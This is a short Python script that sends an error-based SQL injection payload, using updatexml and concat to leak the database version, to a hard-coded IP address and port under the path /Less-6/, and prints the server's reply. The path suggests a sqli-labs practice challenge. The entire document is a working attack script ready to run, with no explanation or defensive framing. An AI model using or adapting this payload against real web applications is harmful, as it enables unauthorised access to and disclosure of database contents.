import requests

# Set the target URL and the payload that caused the error
url = "http://43.136.237.143:40030/Less-6/"
pre = '1"'

# SQL injection payload to retrieve the database version
sql_payload = pre + 'union select updatexml(1,concat(0x7e,(select@@version),0x7e),1); --+'

# Send the request with the SQL injection payload
response = requests.get(url+'?id='+sql_payload)
response.raise_for_status()  # Raise an error if the request failed

# Output the response content
print(response.text)
